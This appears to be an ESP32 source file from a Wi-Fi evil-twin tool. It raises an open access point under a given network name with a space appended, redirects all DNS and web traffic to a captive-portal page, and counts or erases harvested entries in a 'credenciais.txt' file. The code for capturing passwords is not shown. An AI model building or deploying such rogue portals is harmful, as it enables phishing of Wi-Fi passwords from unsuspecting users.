#include "Captive.h"
#include "Globals.h"
#include <SPIFFS.h>

void createCaptivePortal(String networkName) {
  WiFi.mode(WIFI_AP);
  Serial.println("Iniciando Captive Portal...");

  String apName = networkName + " ";
  WiFi.softAPdisconnect(true);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  bool result = WiFi.softAP(apName.c_str(), NULL, 6);

  if (result) {
    Serial.println("AP criado com sucesso.");
    IPAddress IP = WiFi.softAPIP();
    ipSelecionado = IP.toString();
  }

  dnsServer.start(53, "*", WiFi.softAPIP());
  
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(SPIFFS, "/index.html", "text/html");
  });

  server.onNotFound([](AsyncWebServerRequest *request) {
    request->redirect("/");
  });

  server.begin();
}

void stopCaptivePortal() {
  Serial.println("Parando Captive Portal...");
  WiFi.softAPdisconnect(true);
  dnsServer.stop();
  WiFi.mode(WIFI_STA);
}

void EraseData() {
  if (SPIFFS.exists("/credenciais.txt")) {
    File file = SPIFFS.open("/credenciais.txt", FILE_WRITE);
    if (file) {
      file.close();
      Serial.println("Credenciais apagadas.");
    }
  }
}

void contarCredenciais() {
  totalCredenciais = 0;
  contadorLinhas = 0;
  if (SPIFFS.exists("/credenciais.txt")) {
    File file = SPIFFS.open("/credenciais.txt", FILE_READ);
    if (file) {
      String linha;
      while (file.available()) {
        linha = file.readStringUntil('\n');
        linha.trim();
        if (linha.length() > 0) {
          contadorLinhas++;
        }
      }
      file.close();
      totalCredenciais = contadorLinhas / 5;
    }
  }
  if (contadorLinhas % 5 != 0 && contadorLinhas > 0) {
    totalCredenciais++;
  }
}
